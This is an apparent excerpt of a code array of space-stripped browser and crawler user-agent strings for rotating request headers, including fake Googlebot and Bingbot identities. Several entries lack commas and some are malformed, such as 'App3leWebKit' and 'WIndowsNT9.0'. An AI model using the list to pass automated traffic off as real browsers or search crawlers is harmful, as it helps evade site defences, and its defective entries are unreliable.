"Mozilla/5.0(X11;U;Linuxi686;en-US)AppleWebKit/532.8(KHTML,likeGecko)Chrome/4.0.277.0Safari/532.8",
"BlackBerry8320/4.2.2Profile/MIDP-2.0Configuration/CLDC-1.1VendorID/100",
"Mozilla/4.0(compatible;MSIE6.0;WindowsNT5.1;snprtz|S26320700000083|2600#ServicePack1#2#5#154321|isdn)"
"BlackBerry8330/4.3.0Profile/MIDP-2.0Configuration/CLDC-1.1VendorID/105",
"BlackBerry9000/4.6.0.167Profile/MIDP-2.0Configuration/CLDC-1.1VendorID/102",
"BlackBerry9530/4.7.0.167Profile/MIDP-2.0Configuration/CLDC-1.1VendorID/102UP.Link/6.3.1.20.0",
"BlackBerry9700/5.0.0.351Profile/MIDP-2.1Configuration/CLDC-1.1VendorID/123",
"Bloglines/3.1(http://www.bloglines.com)",
"Mozilla/5.0(compatible;MSIE8.0;WindowsNT6.1;Trident/4.0;GTB7.4;InfoPath.2;SV1;.NETCLR3.3.69573;WOW64;en-US)"
"Mozilla/5.0(compatible;MSIE8.0;WindowsNT6.0;Trident/4.0;WOW64;Trident/4.0;SLCC2;.NETCLR2.0.50727;.NETCLR3.5.30729;.NETCLR3.0.30729;.NETCLR1.0.3705;.NETCLR1.1.4322)"
"Mozilla/5.0(compatible;MSIE8.0;WindowsNT6.0;Trident/4.0;InfoPath.1;SV1;.NETCLR3.8.36217;WOW64;en-US)"
"Mozilla/5.0(compatible;MSIE8.0;WindowsNT6.0;Trident/4.0;.NETCLR2.7.58687;SLCC2;MediaCenterPC5.0;Zune3.4;TabletPC3.6;InfoPath.3)"
"CSSCheck/1.2.2",
"Dillo/2.0",
"DoCoMo/2.0SH901iC(c100;TB;W24H12)",
"DownloadDemon/3.5.0.11",
"ELinks/0.12~pre5-4",
"11.50"
"PHP/7.1"
"Python-urllib/2.7"
"Rome"
"TinyTinyRSS/1.15.3(http://tt-rss.org/)"
"TinyTinyRSS/17.12(http://tt-rss.org/"
"ELinks(0.4pre5;Linux2.6.10-ac7i686;80x33)",
"ELinks/0.9.3(textmode;Linux2.6.9-kanotix-8i686;127x41)",
"EmailWolf1.00",
"everyfeed-spider/2.0(http://www.everyfeed.com)",
"facebookscraper/1.0(http://www.facebook.com/sharescraper_help.php)",
"FAST-WebCrawler/3.8(crawlerattrddotoverturedotcom;http://www.alltheweb.com/help/webmaster/crawler)",
"FeedFetcher-Google;(http://www.google.com/feedfetcher.html)",
"Gaisbot/3.0(robot@gais.cs.ccu.edu.tw;http://gais.cs.ccu.edu.tw/robot.php)",
"Googlebot/2.1(http://www.googlebot.com/bot.html)",
"Mozilla/5.0(WindowsNT6.1;WOW64;rv:13.0)Gecko/20100101Firefox/13.0.1",
"Mozilla/5.0(WindowsNT6.1;WOW64)AppleWebKit/536.5(KHTML,likeGecko)Chrome/19.0.1084.56Safari/536.5",
"Opera/5.0(Ubuntu;U;WindowsNT6.1;es;rv:1.9.2.13)Gecko/20101203Firefox/3.6.13"
"Opera/5.0(SunOS5.8sun4u;U)[en]"
"Mozilla/5.0(WindowsNT6.1;WOW64)AppleWebKit/536.11(KHTML,likeGecko)Chrome/20.0.1132.47Safari/536.11",
"Mozilla/5.0(Macintosh;IntelMacOSX10_7_4)AppleWebKit/534.57.2(KHTML,likeGecko)Version/5.1.7Safari/534.57.2",
"Mozilla/5.0(WindowsNT5.1;rv:13.0)Gecko/20100101Firefox/13.0.1",
"Mozilla/5.0(Macintosh;IntelMacOSX10_7_4)AppleWebKit/536.11(KHTML,likeGecko)Chrome/20.0.1132.47Safari/536.11",
"Mozilla/5.0(WindowsNT6.1;rv:13.0)Gecko/20100101Firefox/13.0.1",
"Mozilla/5.0(WindowsNT6.1)AppleWebKit/536.5(KHTML,likeGecko)Chrome/19.0.1084.56Safari/536.5",
"Mozilla/5.0(compatible;MSIE9.0;WindowsNT6.1;WOW64;Trident/5.0)",
"Mozilla/5.0(Macintosh;IntelMacOSX10.7;rv:13.0)Gecko/20100101Firefox/13.0.1",
"Mozilla/5.0(Macintosh;IntelMacOSX10_7_4)AppleWebKit/536.5(KHTML,likeGecko)Chrome/19.0.1084.56Safari/536.5",
"Mozilla/5.0(WindowsNT6.1)AppleWebKit/536.11(KHTML,likeGecko)Chrome/20.0.1132.47Safari/536.11",
"Mozilla/5.0(WindowsNT5.1)AppleWebKit/536.5(KHTML,likeGecko)Chrome/19.0.1084.56Safari/536.5",
"Mozilla/5.0(WindowsNT5.1)AppleWebKit/536.11(KHTML,likeGecko)Chrome/20.0.1132.47Safari/536.11",
"Mozilla/5.0(Linux;U;Android2.2;fr-fr;Desire_A8181Build/FRF91)App3leWebKit/53.1(KHTML,likeGecko)Version/4.0MobileSafari/533.1",
"Mozilla/5.0(Macintosh;IntelMacOSX10.6;rv:13.0)Gecko/20100101Firefox/13.0.1",
"Mozilla/5.0(iPhone;CPUiPhoneOS5_1_1likeMacOSX)AppleWebKit/534.46(KHTML,likeGecko)Version/5.1Mobile/9B206Safari/7534.48.3",
"Mozilla/4.0(compatible;MSIE6.0;MSIE5.5;WindowsNT5.0)Opera7.02Bork-edition[en]",
"Mozilla/5.0(WindowsNT6.1;WOW64;rv:12.0)Gecko/20100101Firefox/12.0",
"Mozilla/5.0(Macintosh;IntelMacOSX10_6_8)AppleWebKit/534.57.2(KHTML,likeGecko)Version/5.1.7Safari/534.57.2",
"Mozilla/5.0(Windows;U;WindowsNT5.1;en-US;rv:1.9.2)Gecko/20100115Firefox/3.6",
"Mozilla/5.0(iPad;CPUOS5_1_1likeMacOSX)AppleWebKit/534.46(KHTML,likeGecko)Version/5.1Mobile/9B206Safari/7534.48.3",
"Mozilla/4.0(compatible;MSIE6.0;WindowsNT5.1;SV1;FunWebProducts;.NETCLR1.1.4322;PeoplePal6.2)",
"Mozilla/5.0(Macintosh;IntelMacOSX10_6_8)AppleWebKit/536.11(KHTML,likeGecko)Chrome/20.0.1132.47Safari/536.11",
"Mozilla/4.0(compatible;MSIE7.0;WindowsNT5.1;SV1;.NETCLR2.0.50727)",
"Mozilla/5.0(WindowsNT6.1;WOW64)AppleWebKit/536.11(KHTML,likeGecko)Chrome/20.0.1132.57Safari/536.11",
"Mozilla/5.0(WindowsNT5.1;rv:5.0.1)Gecko/20100101Firefox/5.0.1",
"Mozilla/5.0(compatible;MSIE9.0;WindowsNT6.1;Trident/5.0)",
"Mozilla/5.0(WindowsNT6.1;rv:5.0)Gecko/20100101Firefox/5.02",
"Opera/9.80(WindowsNT5.1;U;en)Presto/2.10.229Version/11.60",
"Mozilla/5.0(WindowsNT6.1;WOW64;rv:5.0)Gecko/20100101Firefox/5.0",
"Mozilla/4.0(compatible;MSIE7.0;WindowsNT5.1;Trident/4.0;.NETCLR2.0.50727;.NETCLR3.0.4506.2152;.NETCLR3.5.30729)",
"Mozilla/4.0(compatible;MSIE7.0;WindowsNT5.1;Trident/4.0;.NETCLR1.1.4322)",
"Mozilla/4.0(compatible;MSIE8.0;WindowsNT6.0;Trident/4.0;Mozilla/4.0(compatible;MSIE6.0;WindowsNT5.1;SV1);.NETCLR3.5.30729)",
"Mozilla/5.0(WindowsNT6.0)AppleWebKit/535.1(KHTML,likeGecko)Chrome/13.0.782.112Safari/535.1",
"Mozilla/5.0(X11;Ubuntu;Linuxx86_64;rv:13.0)Gecko/20100101Firefox/13.0.1",
"Mozilla/5.0(WindowsNT6.1;WOW64)AppleWebKit/535.1(KHTML,likeGecko)Chrome/13.0.782.112Safari/535.1",
"Mozilla/5.0(WindowsNT6.1;rv:2.0b7pre)Gecko/20100921Firefox/4.0b7pre",
"Mozilla/5.0(Macintosh;IntelMacOSX10_6_8)AppleWebKit/536.5(KHTML,likeGecko)Chrome/19.0.1084.56Safari/536.5",
"Mozilla/5.0(WindowsNT5.1;rv:12.0)Gecko/20100101Firefox/12.0",
"Mozilla/4.0(compatible;MSIE6.0;WindowsNT5.1)",
"Mozilla/5.0(WindowsNT6.1;rv:12.0)Gecko/20100101Firefox/12.0",
"Mozilla/4.0(compatible;MSIE6.0;WindowsNT5.1;SV1;MRA5.8(build4157);.NETCLR2.0.50727;AskTbPTV/5.11.3.15590)",
"Mozilla/5.0(X11;Ubuntu;Linuxi686;rv:13.0)Gecko/20100101Firefox/13.0.1",
"Mozilla/4.0(compatible;MSIE6.0;WindowsNT5.1;SV1)",
"Mozilla/5.0(Macintosh;IntelMacOSX10_7_4)AppleWebKit/534.57.5(KHTML,likeGecko)Version/5.1.7Safari/534.57.4",
"Mozilla/5.0(WindowsNT6.0;rv:13.0)Gecko/20100101Firefox/13.0.1",
"Mozilla/5.0(WindowsNT6.0;rv:13.0)Gecko/20100101Firefox/13.0.1",
"Googlebot-Image/1.0",
"Googlebot-News",
"Googlebot-Video/1.0",
"Gregarius/0.5.2(http://devlog.gregarius.net/docs/ua)",
"grub-client-1.5.3;(grub-client-1.5.3;Crawlyourownstuffwithhttp://grub.org)",
"GulperWebBot0.2.4(www.ecsl.cs.sunysb.edu/~maxim/cgi-bin/Link/GulperBot)",
"HTC_DreamMozilla/5.0(Linux;U;Android1.5;en-ca;Build/CUPCAKE)AppleWebKit/528.5(KHTML,likeGecko)Version/3.1.2MobileSafari/525.20.1",
"HTC-ST7377/1.59.502.3(67150)Opera/9.50(WindowsNT5.1;U;en)UP.Link/6.3.1.17.0",
"HTMLParser/1.6",
"iTunes/4.2(Macintosh;U;PPCMacOSX10.2)",
"iTunes/9.0.2(Windows;N)",
"Mozilla/5.0(compatible;bingbot/2.0;+http://www.bing.com/bingbot.htm)"
"iTunes/9.0.3(Macintosh;U;IntelMacOSX10_6_2;en-ca)",
"Java/1.6.0_13",
"Jigsaw/2.2.5W3C_CSS_Validator_JFouffa/2.0",
"Konqueror/3.0-rc4;(Konqueror/3.0-rc4;i686Linux;;datecode)",
"LG-GC900/V10aObigo/WAP2.0Profile/MIDP-2.1Configuration/CLDC-1.1",
"LG-LX550AU-MIC-LX550/2.0MMP/2.0Profile/MIDP-2.0Configuration/CLDC-1.1",
"libwww-perl/5.820",
"Links/0.9.1(Linux2.4.24;i386;)",
"Links(2.1pre15;FreeBSD5.3-RELEASEi386;196x84)",
"Links(2.1pre15;Linux2.4.26i686;158x61)",
"Links(2.3pre1;Linux2.6.38-8-genericx86_64;170x48)",
"Lynx/2.8.5rel.1libwww-FM/2.14SSL-MM/1.4.1GNUTLS/0.8.12",
"Lynx/2.8.7dev.4libwww-FM/2.14SSL-MM/1.4.1OpenSSL/0.9.8d",
"Mediapartners-Google",
"MicrosoftURLControl-6.00.8862",
"Midori/0.1.10(X11;Linuxi686;U;en-us)WebKit/(531).(2)",
"MOT-L7v/08.B7.5DRMIB/2.2.1Profile/MIDP-2.0Configuration/CLDC-1.1UP.Link/6.3.0.0.0",
"MOTORIZR-Z8/46.00.00Mozilla/4.0(compatible;MSIE6.0;SymbianOS;356)Opera8.65[it]UP.Link/6.3.0.0.0",
"MOT-V177/0.1.75UP.Browser/6.2.3.9.c.12(GUI)MMP/2.0UP.Link/6.3.1.13.0",
"MOT-V9mm/00.62UP.Browser/6.2.3.4.c.1.123(GUI)MMP/2.0",
"Mozilla/1.22(compatible;MSIE5.01;PalmOS3.0)EudoraWeb2.1",
"Mozilla/2.02E(Win95;U)",
"Mozilla/2.0(compatible;AskJeeves/Teoma)",
"Mozilla/3.01Gold(Win95;I)",
"Mozilla/3.0(compatible;NetPositive/2.1.1;BeOS)",
"Mozilla/4.0(compatible;GoogleToolbar4.0.1019.5266-big;WindowsXP5.1;MSIE6.0.2900.2180)",
"Mozilla/4.0(compatible;Linux2.6.22)NetFront/3.4Kindle/2.0(screen600x800)",
"Mozilla/4.0(compatible;MSIE4.01;WindowsCE;PPC;MDAPro/1.0Profile/MIDP-2.0Configuration/CLDC-1.1)",
"Mozilla/4.0(compatible;MSIE5.0;Series80/2.0Nokia9500/4.51Profile/MIDP-2.0Configuration/CLDC-1.1)",
"Mozilla/4.0(compatible;MSIE5.15;Mac_PowerPC)",
"Mozilla/4.0(compatible;MSIE5.5;Windows98;Win9x4.90)",
"Mozilla/4.0(compatible;MSIE5.5;WindowsNT5.0)",
"Mozilla/4.0(compatible;MSIE6.0;j2me)ReqwirelessWeb/3.5",
"Mozilla/4.0(compatible;MSIE6.0;Windows98;PalmSource/hspr-H102;Blazer/4.0)16;320x320",
"Mozilla/4.0(compatible;MSIE6.0;WindowsCE;IEMobile6.12;MicrosoftZuneHD4.3)",
"Mozilla/4.0(compatible;MSIE6.0;WindowsNT5.0;en)Opera8.0",
"Mozilla/4.0(compatible;MSIE6.0;WindowsNT5.1)",
"Mozilla/4.0(compatible;MSIE7.0;WindowsNT5.1;AvantBrowser;AvantBrowser;.NETCLR1.0.3705;.NETCLR1.1.4322;MediaCenterPC4.0;.NETCLR2.0.50727;.NETCLR3.0.04506.30)",
"Mozilla/4.0(compatible;MSIE7.0;WindowsNT5.1;winfx;.NETCLR1.1.4322;.NETCLR2.0.50727;Zune2.0)",
"Mozilla/4.0(compatible;MSIE7.0;WindowsNT6.0)",
"Mozilla/4.0(compatible;MSIE7.0;WindowsNT6.0;Trident/4.0)",
"Mozilla/4.0(compatible;MSIE7.0;WindowsNT6.0;Trident/5.0)",
"Mozilla/4.0(compatible;MSIE7.0;WindowsNT6.1;Trident/6.0)",
"Mozilla/4.0(compatible;MSIE7.0;WindowsPhoneOS7.0;Trident/3.1;IEMobile/7.0)Asus;Galaxy6",
"Mozilla/4.0(compatible;MSIE8.0;WindowsNT6.0;Trident/4.0)",
"Mozilla/4.0(compatible;MSIE8.0;WindowsNT6.1;Trident/4.0)",
"Mozilla/4.0(PDA;PalmOS/sony/modelprmr/Revision:1.1.54(en))NetFront/3.0",
"Mozilla/4.0(PSP(PlayStationPortable);2.00)",
"Mozilla/4.1(compatible;MSIE5.0;SymbianOS;Nokia6600;452)Opera6.20[en-US]",
"Mozilla/4.77[en](X11;I;IRIX;646.5IP30)",
"Mozilla/4.8[en](WindowsNT5.1;U)",
"Mozilla/4.8[en](X11;U;SunOS;5.7sun4u)",
"Mozilla/5.0(Android;Linuxarmv7l;rv:10.0.1)Gecko/20100101Firefox/10.0.1Fennec/10.0.1",
"Mozilla/5.0(WindowsNT6.1;rv:27.3)Gecko/20130101Firefox/27.3",
"Mozilla/5.0(Macintosh;IntelMacOSX10.6;rv:25.0)Gecko/20100101Firefox/25.0",
"Mozilla/5.0(X11;Ubuntu;Linuxx86_64;rv:24.0)Gecko/20100101Firefox/24.0",
"Mozilla/5.0(Windows;U;MSIE9.0;WIndowsNT9.0;en-US))",
"Mozilla/5.0(compatible;MSIE10.0;WindowsNT6.1;WOW64;Trident/6.0)",
"Mozilla/5.0(compatible;MSIE10.0;WindowsNT6.1;Trident/4.0;InfoPath.2;SV1;.NETCLR2.0.50727;WOW64)",
"Mozilla/5.0(compatible;MSIE10.0;Macintosh;IntelMacOSX10_7_3;Trident/6.0)",
"Opera/12.0(WindowsNT5.2;U;en)Presto/22.9.168Version/12.00",
"Opera/9.80(WindowsNT6.0)Presto/2.12.388Version/12.14",
"Mozilla/5.0(WindowsNT6.0;rv:2.0)Gecko/20100101Firefox/4.0Opera12.14",
"Mozilla/5.0(compatible;MSIE9.0;WindowsNT6.0)Opera12.14",
"Opera/12.80(WindowsNT5.1;U;en)Presto/2.10.289Version/12.02",
"Opera/9.80(WindowsNT6.1;U;es-ES)Presto/2.9.181Version/12.00",
"Opera/9.80(WindowsNT5.1;U;zh-sg)Presto/2.9.181Version/12.00",
"Mozilla/5.0(compatible;MSIE9.0;WindowsPhoneOS7.5;Trident/5.0;IEMobile/9.0)",
"HTC_Touch_3GMozilla/4.0(compatible;MSIE6.0;WindowsCE;IEMobile7.11)",
"Mozilla/5.0(Android;Linuxarmv7l;rv:2.0.1)Gecko/20100101Firefox/4.0.1Fennec/2.0.1",
"Mozilla/5.0(BeOS;U;BeOSBePC;en-US;rv:1.9a1)Gecko/20060702SeaMonkey/1.5a",
"Mozilla/5.0(BlackBerry;U;BlackBerry9800;en)AppleWebKit/534.1(KHTML,LikeGecko)Version/6.0.0.141MobileSafari/534.1",
"Mozilla/5.0(compatible;bingbot/2.0http://www.bing.com/bingbot.htm)",
"Mozilla/5.0(compatible;Exabot/3.0;http://www.exabot.com/go/robot)",
"Mozilla/5.0(compatible;Googlebot/2.1;http://www.google.com/bot.html)",
"Mozilla/5.0(Windows;U;WindowsNT5.1;en-US)AppleWebKit/525.19(KHTML,likeGecko)Chrome/1.0.154.53Safari/525.19"
"Mozilla/5.0(Windows;U;WindowsNT5.1;en-US)AppleWebKit/525.19(KHTML,likeGecko)Chrome/1.0.154.36Safari/525.19"
"Mozilla/5.0(Windows;U;WindowsNT6.1;en-US)AppleWebKit/534.10(KHTML,likeGecko)Chrome/7.0.540.0Safari/534.10"
"Mozilla/5.0(X11;U;Linuxi686;en-US;rv:1.7.12)Gecko/20050923CentOS/1.0.7-1.4.1.centos4Firefox/1.0.7"
"Mozilla/5.0(compatible;Konqueror/3.3;Linux2.6.8-gentoo-r3;X11;",
"Mozilla/5.0(compatible;Konqueror/3.5;Linux2.6.30-7.dmz.1-liquorix-686;X11)KHTML/3.5.10(likeGecko)(Debianpackage4:3.5.10.dfsg.1-1b1)",
"Mozilla/5.0(compatible;Konqueror/3.5;Linux;en_US)KHTML/3.5.6(likeGecko)(Kubuntu)",
"Mozilla/5.0(compatible;Konqueror/3.5;NetBSD4.0_RC3;X11)KHTML/3.5.7(likeGecko)",
"Mozilla/5.0(compatible;Konqueror/3.5;SunOS)KHTML/3.5.1(likeGecko)",
"Mozilla/5.0(compatible;Konqueror/4.1;DragonFly)KHTML/4.1.4(likeGecko)",
"Mozilla/5.0(compatible;Konqueror/4.1;OpenBSD)KHTML/4.1.4(likeGecko)",
"Mozilla/5.0(compatible;Konqueror/4.2;Linux)KHTML/4.2.4(likeGecko)Slackware/13.0",
"Mozilla/5.0(compatible;Konqueror/4.3;Linux)KHTML/4.3.1(likeGecko)Fedora/4.3.1-3.fc11",
"Mozilla/5.0(compatible;Konqueror/4.4;Linux2.6.32-22-generic;X11;en_US)KHTML/4.4.3(likeGecko)Kubuntu",
"Mozilla/5.0(compatible;Konqueror/4.4;Linux)KHTML/4.4.1(likeGecko)Fedora/4.4.1-1.fc12",
"Mozilla/5.0(compatible;Konqueror/4.5;FreeBSD)KHTML/4.5.4(likeGecko)",
"Mozilla/5.0(compatible;Konqueror/4.5;NetBSD5.0.2;X11;amd64;en_US)KHTML/4.5.4(likeGecko)",
"Mozilla/5.0(compatible;Konqueror/4.5;Windows)KHTML/4.5.4(likeGecko)",
"Mozilla/5.0(compatible;MSIE10.0;WindowsNT6.1;WOW64;Trident/6.0)",
"Mozilla/5.0(compatible;MSIE10.6;WindowsNT6.1;Trident/5.0;InfoPath.2;SLCC1;.NETCLR3.0.4506.2152;.NETCLR3.5.30729;.NETCLR2.0.50727)3gpp-gbaUNTRUSTED/1.0",
"Mozilla/5.0(compatible;MSIE9.0;WindowsNT6.1;Trident/5.0)",
"Mozilla/5.0(compatible;MSIE9.0;WindowsNT6.2;Trident/5.0)",
"Mozilla/5.0(compatible;MSIE9.0;WindowsNT6.2;WOW64;Trident/5.0)",
"Mozilla/5.0(compatible;MSIE9.0;WindowsPhoneOS7.5;Trident/5.0;IEMobile/9.0)",
"Mozilla/5.0(compatible;Yahoo!SlurpChina;http://misc.yahoo.com.cn/help.html)",
"Mozilla/5.0(compatible;Yahoo!Slurp;http://help.yahoo.com/help/us/ysearch/slurp)",
"Mozilla/5.0(en-us)AppleWebKit/525.13(KHTML,likeGecko;GoogleWebPreview)Version/3.1Safari/525.13",
"Mozilla/5.0(hp-tablet;Linux;hpwOS/3.0.2;U;de-DE)AppleWebKit/534.6(KHTML,likeGecko)wOSBrowser/234.40.1Safari/534.6TouchPad/1.0",
"Mozilla/5.0(iPad;U;CPUOS3_2likeMacOSX;en-us)AppleWebKit/531.21.10(KHTML,likeGecko)Version/4.0.4Mobile/7B334bSafari/531.21.10",
"Mozilla/5.0(iPad;U;CPUOS4_2_1likeMacOSX;ja-jp)AppleWebKit/533.17.9(KHTML,likeGecko)Version/5.0.2Mobile/8C148Safari/6533.18.5",
"Mozilla/5.0(iPad;U;CPUOS4_3likeMacOSX;en-us)AppleWebKit/533.17.9(KHTML,likeGecko)Version/5.0.2Mobile/8F190Safari/6533.18.5",
"Mozilla/5.0(iPhone;U;CPUiPhoneOS2_0likeMacOSX;en-us)AppleWebKit/525.18.1(KHTML,likeGecko)Version/3.1.1Mobile/5A347Safari/525.200",
"Mozilla/5.0(iPhone;U;CPUiPhoneOS3_0likeMacOSX;en-us)AppleWebKit/528.18(KHTML,likeGecko)Version/4.0Mobile/7A341Safari/528.16",
"Mozilla/5.0(iPhone;U;CPUiPhoneOS4_0likeMacOSX;en-us)AppleWebKit/532.9(KHTML,likeGecko)Version/4.0.5Mobile/8A293Safari/531.22.7",
"Mozilla/5.0(iPhone;U;CPUiPhoneOS4_2_1likeMacOSX;da-dk)AppleWebKit/533.17.9(KHTML,likeGecko)Version/5.0.2Mobile/8C148Safari/6533.18.5",
"Mozilla/5.0(iPhone;U;CPUiPhoneOS4_3likeMacOSX;de-de)AppleWebKit/533.17.9(KHTML,likeGecko)Mobile/8F190",
"Mozilla/5.0(iPhone;U;CPUiPhoneOS)(compatible;Googlebot-Mobile/2.1;http://www.google.com/bot.html)",
"Mozilla/5.0(iPhone;U;CPUlikeMacOSX;en)AppleWebKit/420(KHTML,likeGecko)Version/3.0Mobile/1A543aSafari/419.3",
"Mozilla/5.0(iPod;U;CPUiPhoneOS2_2_1likeMacOSX;en-us)AppleWebKit/525.18.1(KHTML,likeGecko)Version/3.1.1Mobile/5H11aSafari/525.20",
"Mozilla/5.0(iPod;U;CPUiPhoneOS3_1_1likeMacOSX;en-us)AppleWebKit/528.18(KHTML,likeGecko)Mobile/7C145",
"Mozilla/5.0(Linux;U;Android0.5;en-us)AppleWebKit/522(KHTML,likeGecko)Safari/419.3",
"Mozilla/5.0(Linux;U;Android1.0;en-us;dream)AppleWebKit/525.10(KHTML,likeGecko)Version/3.0.4MobileSafari/523.12.2",
"Mozilla/5.0(Linux;U;Android1.1;en-gb;dream)AppleWebKit/525.10(KHTML,likeGecko)Version/3.0.4MobileSafari/523.12.2",
"Mozilla/5.0(Linux;U;Android1.5;de-ch;HTCHeroBuild/CUPCAKE)AppleWebKit/528.5(KHTML,likeGecko)Version/3.1.2MobileSafari/525.20.1",
"Mozilla/5.0(Linux;U;Android1.5;de-de;GalaxyBuild/CUPCAKE)AppleWebKit/528.5(KHTML,likeGecko)Version/3.1.2MobileSafari/525.20.1",
"Mozilla/5.0(Linux;U;Android1.5;de-de;HTCMagicBuild/PLAT-RC33)AppleWebKit/528.5(KHTML,likeGecko)Version/3.1.2MobileSafari/525.20.1FirePHP/0.3",
"Mozilla/5.0(Linux;U;Android1.5;en-gb;T-Mobile_G2_TouchBuild/CUPCAKE)AppleWebKit/528.5(KHTML,likeGecko)Version/3.1.2MobileSafari/525.20.1",
"Mozilla/5.0(Linux;U;Android1.5;en-us;htc_bahamasBuild/CRB17)AppleWebKit/528.5(KHTML,likeGecko)Version/3.1.2MobileSafari/525.20.1",
"Mozilla/5.0(Linux;U;Android1.5;en-us;sdkBuild/CUPCAKE)AppleWebkit/528.5(KHTML,likeGecko)Version/3.1.2MobileSafari/525.20.1",
"Mozilla/5.0(Linux;U;Android1.5;en-us;SPH-M900Build/CUPCAKE)AppleWebKit/528.5(KHTML,likeGecko)Version/3.1.2MobileSafari/525.20.1",
"Mozilla/5.0(Linux;U;Android1.5;en-us;T-MobileG1Build/CRB43)AppleWebKit/528.5(KHTML,likeGecko)Version/3.1.2MobileSafari525.20.1",
"Mozilla/5.0(Linux;U;Android1.5;fr-fr;GT-I5700Build/CUPCAKE)AppleWebKit/528.5(KHTML,likeGecko)Version/3.1.2MobileSafari/525.20.1",
"Mozilla/5.0(Linux;U;Android1.6;en-us;HTC_TATTOO_A3288Build/DRC79)AppleWebKit/528.5(KHTML,likeGecko)Version/3.1.2MobileSafari/525.20.1",
"Mozilla/5.0(Linux;U;Android1.6;en-us;SonyEricssonX10iBuild/R1AA056)AppleWebKit/528.5(KHTML,likeGecko)Version/3.1.2MobileSafari/525.20.1",
"Mozilla/5.0(Linux;U;Android1.6;es-es;SonyEricssonX10iBuild/R1FA016)AppleWebKit/528.5(KHTML,likeGecko)Version/3.1.2MobileSafari/525.20.1",
"Mozilla/5.0(Linux;U;Android2.0.1;de-de;MilestoneBuild/SHOLS_U2_01.14.0)AppleWebKit/530.17(KHTML,likeGecko)Version/4.0MobileSafari/530.17",
"Mozilla/5.0(Linux;U;Android2.0;en-us;DroidBuild/ESD20)AppleWebKit/530.17(KHTML,likeGecko)Version/4.0MobileSafari/530.17",
"Mozilla/5.0(Linux;U;Android2.0;en-us;MilestoneBuild/SHOLS_U2_01.03.1)AppleWebKit/530.17(KHTML,likeGecko)Version/4.0MobileSafari/530.17",
"Mozilla/5.0(Linux;U;Android2.1;en-us;HTCLegendBuild/cupcake)AppleWebKit/530.17(KHTML,likeGecko)Version/4.0MobileSafari/530.17",
"Mozilla/5.0(Linux;U;Android2.1;en-us;NexusOneBuild/ERD62)AppleWebKit/530.17(KHTML,likeGecko)Version/4.0MobileSafari/530.17",
"Mozilla/5.0(Linux;U;Android2.1-update1;de-de;HTCDesire1.19.161.5Build/ERE27)AppleWebKit/530.17(KHTML,likeGecko)Version/4.0MobileSafari/530.17",
"Mozilla/5.0(Linux;U;Android2.2;en-ca;GT-P1000MBuild/FROYO)AppleWebKit/533.1(KHTML,likeGecko)Version/4.0MobileSafari/533.1",
"Mozilla/5.0(Linux;U;Android2.2;en-us;ADR6300Build/FRF91)AppleWebKit/533.1(KHTML,likeGecko)Version/4.0MobileSafari/533.1",
"Mozilla/5.0(Linux;U;Android2.2;en-us;DroidBuild/FRG22D)AppleWebKit/533.1(KHTML,likeGecko)Version/4.0MobileSafari/533.1",
"Mozilla/5.0(Linux;U;Android2.2;en-us;NexusOneBuild/FRF91)AppleWebKit/533.1(KHTML,likeGecko)Version/4.0MobileSafari/533.1",
"Mozilla/5.0(Linux;U;Android2.2;en-us;SprintAPA9292KTBuild/FRF91)AppleWebKit/533.1(KHTML,likeGecko)Version/4.0MobileSafari/533.1",
"Mozilla/5.0(Linux;U;Android2.3.4;en-us;BNTV250Build/GINGERBREAD)AppleWebKit/533.1(KHTML,likeGecko)Version/4.0Safari/533.1",
"Mozilla/5.0(Linux;U;Android3.0.1;en-us;GT-P7100Build/HRI83)AppleWebkit/534.13(KHTML,likeGecko)Version/4.0Safari/534.13",
"Mozilla/5.0(Linux;U;Android3.0.1;fr-fr;A500Build/HRI66)AppleWebKit/534.13(KHTML,likeGecko)Version/4.0Safari/534.13",
"Mozilla/5.0(Linux;U;Android3.0;en-us;XoomBuild/HRI39)AppleWebKit/525.10(KHTML,likeGecko)Version/3.0.4MobileSafari/523.12.2",
"Mozilla/5.0(Linux;U;Android4.0.3;de-ch;HTCSensationBuild/IML74K)AppleWebKit/534.30(KHTML,likeGecko)Version/4.0MobileSafari/534.30",
"Mozilla/5.0(Linux;U;Android4.0.3;de-de;GalaxySIIBuild/GRJ22)AppleWebKit/534.30(KHTML,likeGecko)Version/4.0MobileSafari/534.30",
"Mozilla/5.0(LinuxU;en-US)AppleWebKit/528.5(KHTML,likeGecko,Safari/528.5)Version/4.0Kindle/3.0(screen600x800;rotate)",
"Mozilla/5.0(Macintosh;IntelMacOSX10.5;rv:10.0.1)Gecko/20100101Firefox/10.0.1SeaMonkey/2.7.1",
"Mozilla/5.0(Macintosh;IntelMacOSX10_6_8)AppleWebKit/535.2(KHTML,likeGecko)Chrome/15.0.874.54Safari/535.2",
"Mozilla/5.0(Macintosh;IntelMacOSX10_6_8)AppleWebKit/535.7(KHTML,likeGecko)Chrome/16.0.912.36Safari/535.7",
"Mozilla/5.0(Macintosh;IntelMacOSX10.6;rv:2.0.1)Gecko/20100101Firefox/4.0.1",
"Mozilla/5.0(Macintosh;IntelMacOSX10.6;rv:2.0.1)Gecko/20100101Firefox/4.0.1Camino/2.2.1",
"Mozilla/5.0(Macintosh;IntelMacOSX10.6;rv:2.0b6pre)Gecko/20100907Firefox/4.0b6preCamino/2.2a1pre",
"Mozilla/5.0(Macintosh;IntelMacOSX10.6;rv:5.0)Gecko/20100101Firefox/5.0",
"Mozilla/5.0(Macintosh;IntelMacOSX10.6;rv:9.0)Gecko/20100101Firefox/9.0",
"Mozilla/5.0(Macintosh;IntelMacOSX10_7_2)AppleWebKit/535.1(KHTML,likeGecko)Chrome/14.0.835.186Safari/535.1",
"Mozilla/5.0(Macintosh;IntelMacOSX10_7_2;rv:10.0.1)Gecko/20100101Firefox/10.0.1",
"Mozilla/5.0(Macintosh;IntelMacOSX10_7_3)AppleWebKit/534.55.3(KHTML,likeGecko)Version/5.1.3Safari/534.53.10",
"Mozilla/5.0(Macintosh;IntelMacOSX10_8_0)AppleWebKit/536.3(KHTML,likeGecko)Chrome/19.0.1063.0Safari/536.3",
"Mozilla/5.0(Macintosh;U;IntelMacOSX10_5_6;en-US)AppleWebKit/528.16(KHTML,likeGecko,Safari/528.16)OmniWeb/v622.8.0",
"Mozilla/5.0(Macintosh;U;IntelMacOSX10_5_7;en-us)AppleWebKit/530.17(KHTML,likeGecko)Version/4.0Safari/530.17",
"Mozilla/5.0(Macintosh;U;IntelMacOSX10_5_8;en-US)AppleWebKit/532.8(KHTML,likeGecko)Chrome/4.0.302.2Safari/532.8",
"Mozilla/5.0(Macintosh;U;IntelMacOSX10.5;en-US;rv:1.9.1)Gecko/20090624Firefox/3.5",
